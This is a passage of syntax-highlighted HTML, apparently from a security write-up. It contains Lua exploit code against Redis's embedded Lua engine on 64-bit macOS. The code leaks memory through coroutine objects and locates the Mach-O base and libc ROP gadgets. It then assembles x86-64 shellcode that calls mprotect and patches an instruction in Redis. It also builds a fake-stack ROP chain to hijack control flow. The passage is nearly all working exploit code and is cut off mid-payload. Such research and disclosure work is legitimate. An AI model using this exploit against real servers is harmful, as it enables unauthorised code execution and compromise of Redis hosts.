</span><span class='line'>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Found rop: &quot;</span> <span class="o">..</span> <span class="n">name</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> @ &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>        <span class="n">inverted</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">inverted</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">copy_words</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">buf</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">n</span> <span class="k">do</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">from</span><span class="p">)</span>
</span><span class='line'>    <span class="n">from</span> <span class="o">=</span> <span class="n">addbyte</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="nb">table.concat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s2">&quot;</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">check_system</span> <span class="o">=</span> <span class="n">function</span><span class="p">()</span>
</span><span class='line'><span class="c1">-- os:Darwin 14.3.0 x86_64</span>
</span><span class='line'><span class="c1">-- arch_bits:64</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">info</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">INFO&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">os</span> <span class="o">=</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">os:([^</span><span class="se">\r\n</span><span class="s">]*)&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">os</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">Darwin&quot;</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Matches OSX =&gt; &quot;</span> <span class="o">..</span> <span class="n">os</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Not OSX =&gt; &quot;</span> <span class="o">..</span> <span class="n">os</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">arch_bits</span> <span class="o">=</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">arch_bits:([^</span><span class="se">\r\n</span><span class="s">]*)&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">arch_bits</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="s">64&quot;</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] 64 Bit&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Not 64 Bit =&gt; &quot;</span> <span class="o">..</span> <span class="n">arch_bits</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">check_bytecode</span> <span class="o">=</span> <span class="n">function</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">loadstring</span><span class="p">(</span><span class="nb">string.dump</span><span class="p">(</span><span class="n">function</span><span class="p">()</span> <span class="k">end</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">f</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Loading byte code not supported&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Loading byte code supported&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">find_fparser_cmp</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">program_information</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">redis_text_segment</span> <span class="o">=</span> <span class="n">program_information</span><span class="p">.</span><span class="n">redis_segments</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__TEXT&quot;</span><span class="p">]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">stream</span> <span class="o">=</span> <span class="n">new_lazy_stream</span><span class="p">(</span><span class="n">program_information</span><span class="p">.</span><span class="n">redis</span><span class="p">,</span> <span class="n">toint</span><span class="p">(</span><span class="n">redis_text_segment</span><span class="p">.</span><span class="n">vm_size</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">re</span> <span class="o">=</span> <span class="n">join</span><span class="p">(</span><span class="n">dotstar</span><span class="p">(),</span> <span class="n">literal</span><span class="p">(</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">)))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">state</span> <span class="o">=</span> <span class="n">re_start</span><span class="p">(</span><span class="n">re</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">found</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">visited</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">lazy_stream_empty</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">next_byte</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">state</span> <span class="o">=</span> <span class="n">re_restart</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">re</span><span class="p">)</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">state</span> <span class="o">=</span> <span class="n">re_push_byte</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">next_byte</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="o">#</span><span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">current_list</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">s</span> <span class="o">=</span> <span class="n">state</span><span class="p">.</span><span class="n">current_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">FINAL</span> <span class="k">then</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">table.insert</span><span class="p">(</span><span class="n">found</span><span class="p">,</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">-</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">matched</span><span class="p">))</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">found</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] found cmp   r15, 0x1b&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">could not find unique cmp r15,0x1b &quot;</span> <span class="o">..</span> <span class="o">#</span><span class="n">found</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">cmp_addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">start_offset</span><span class="p">,</span> <span class="n">found</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] found cmp @ &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">cmp_addr</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">cmp_addr</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">check_system</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">check_bytecode</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">co</span> <span class="o">=</span> <span class="nb">coroutine.wrap</span><span class="p">(</span><span class="n">function</span><span class="p">()</span> <span class="k">end</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addbyte</span><span class="p">(</span><span class="n">asstring</span><span class="p">(</span><span class="n">co</span><span class="p">),</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">macho_address</span> <span class="o">=</span> <span class="n">findmacho</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">[*] found macho base address: &#39;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">macho_address</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">program_information</span> <span class="o">=</span> <span class="n">parse_redis_macho</span><span class="p">(</span><span class="n">macho_address</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">mprotect_addr</span>  <span class="o">=</span> <span class="n">parse_libkernel_macho</span><span class="p">(</span><span class="n">program_information</span><span class="p">.</span><span class="n">libkernel</span><span class="p">)</span>
</span><span class='line'><span class="kd">local</span> <span class="n">libc_segments</span> <span class="o">=</span> <span class="n">parse_libsystem_c_macho</span><span class="p">(</span><span class="n">program_information</span><span class="p">.</span><span class="n">libsystem_c</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">longjmp_addr</span> <span class="o">=</span> <span class="n">program_information</span><span class="p">.</span><span class="n">longjmp_address</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">named_rops</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'><span class="n">named_rops</span><span class="p">[</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0x5D</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">)]</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">poprsipoprbp&quot;</span><span class="p">,</span> <span class="n">offsets</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x1b83</span><span class="p">,</span> <span class="mh">0x144b</span><span class="p">}}</span>
</span><span class='line'><span class="n">named_rops</span><span class="p">[</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x5F</span><span class="p">,</span><span class="mh">0x5D</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">)]</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">poprdipoprbp&quot;</span><span class="p">,</span> <span class="n">offsets</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x1d08</span><span class="p">,</span> <span class="mh">0x15ee</span><span class="p">}}</span>
</span><span class='line'><span class="n">named_rops</span><span class="p">[</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">)]</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">poprbxpopr14poprbp&quot;</span><span class="p">,</span> <span class="n">offsets</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x1b81</span><span class="p">,</span><span class="mh">0x1449</span><span class="p">}}</span>
</span><span class='line'><span class="n">named_rops</span><span class="p">[</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">)]</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">movrdxr14callrbx&quot;</span><span class="p">,</span> <span class="n">offsets</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x642f4</span><span class="p">,</span><span class="mh">0x604f0</span><span class="p">}}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">target_instruction</span> <span class="o">=</span> <span class="n">find_fparser_cmp</span><span class="p">(</span><span class="n">program_information</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">libc_text_segment</span> <span class="o">=</span> <span class="n">libc_segments</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__TEXT&quot;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c1">-- we assume vm_addr == 0</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">libc_text_stream</span> <span class="o">=</span> <span class="n">new_lazy_stream</span><span class="p">(</span><span class="n">program_information</span><span class="p">.</span><span class="n">libsystem_c</span><span class="p">,</span> <span class="n">toint</span><span class="p">(</span><span class="n">libc_text_segment</span><span class="p">.</span><span class="n">vm_size</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">rop_addresses</span> <span class="o">=</span> <span class="n">find_rops_and_assert</span><span class="p">(</span><span class="n">named_rops</span><span class="p">,</span> <span class="n">libc_text_stream</span><span class="p">,</span> <span class="n">program_information</span><span class="p">.</span><span class="n">libsystem_c</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">poprbp</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprsipoprbp</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">dummy</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\1\1\1\1\1\1\1\1</span><span class="s">&#39;</span>
</span><span class='line'><span class="kd">local</span> <span class="n">null</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\0\0\0\0\0\0\0\0</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">payload_str</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">old_jump_buf</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'><span class="nb">collectgarbage</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">co</span> <span class="o">=</span> <span class="nb">coroutine.create</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">stack_pointer</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addbyte</span><span class="p">(</span><span class="n">asstring</span><span class="p">(</span><span class="n">co</span><span class="p">),</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">21</span><span class="p">))</span>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] leaked stack pointer: &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">stack_pointer</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">jmp_buf_eip</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">stack_pointer</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">jmp_buf_sp</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">stack_pointer</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">existing_eip</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">jmp_buf_eip</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] old jump_buf eip &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">existing_eip</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">existing_sp</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">jmp_buf_sp</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] existing sp &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">existing_sp</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="n">old_jump_buf</span> <span class="o">=</span> <span class="n">copy_words</span><span class="p">(</span><span class="n">stack_pointer</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">old_jump_buf_addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">cstring</span><span class="p">(</span><span class="n">old_jump_buf</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">shellcode</span> <span class="o">=</span>
</span><span class='line'>    <span class="c1">-- 48 bf VALUE    movabs    rdi,VALUE</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbf</span><span class="p">)</span> <span class="o">..</span> <span class="n">pagealign</span><span class="p">(</span><span class="n">target_instruction</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>    <span class="c1">-- 48 c7 c6 00 20 00 00    mov    rsi,0x2000</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>    <span class="c1">-- 48 c7 c2 07 00 00 00    mov    rdx,0x7</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- 48 b8 VALUE movabs rax, VALUE</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">)</span> <span class="o">..</span> <span class="n">mprotect_addr</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- ff d0                   call   rax</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- 48 bf VALUE    movabs    rdi,VALUE</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbf</span><span class="p">)</span> <span class="o">..</span> <span class="n">target_instruction</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- c7 07 VALUE       mov    DWORD PTR [rdi],VALUE</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">)</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- restore permissions</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- 48 bf VALUE    movabs    rdi,VALUE</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbf</span><span class="p">)</span> <span class="o">..</span> <span class="n">pagealign</span><span class="p">(</span><span class="n">target_instruction</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>    <span class="c1">-- 48 c7 c6 00 20 00 00    mov    rsi,0x2000</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>    <span class="c1">-- 48 c7 c2 05 00 00 00    mov    rdx,0x5</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- ret</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0xc3</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">shellcode_ptr</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] shellcode_ptr &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">shellcode_ptr</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">rdi</span> <span class="o">=</span> <span class="n">pagealign</span><span class="p">(</span><span class="n">shellcode_ptr</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">rsi</span> <span class="o">=</span> <span class="n">tob8</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">rdx_all</span> <span class="o">=</span> <span class="n">tob8</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1">-- PROT_READ | PROT_WRITE | PROT_EXEC</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">rdx_read_write</span> <span class="o">=</span> <span class="n">tob8</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">-- PROT_READ | PROT_WRITE</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>          <span class="cm">--[[ padding for our fake stack. `system` calls into the dynamic linker because of stubbed crap. so stack can get quite big. 1024 bytes =&gt; stack overflow and corruption of lua/redis heap ]]</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="squot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="squot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="squot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="squot;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>          <span class="s2">&quot;</span><span class="squot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="squot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="squot;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="cm">--[[ poprdipoprbp, ]]</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprsipoprbp</span><span class="p">,</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprbxpopr14poprbp</span><span class="p">,</span> <span class="n">poprbp</span><span class="p">,</span> <span class="n">rdx_all</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">movrdxr14callrbx</span><span class="p">,</span>
</span><span class='line'>           <span class="n">mprotect_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="n">shellcode_ptr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprdipoprbp</span><span class="p">,</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprsipoprbp</span><span class="p">,</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
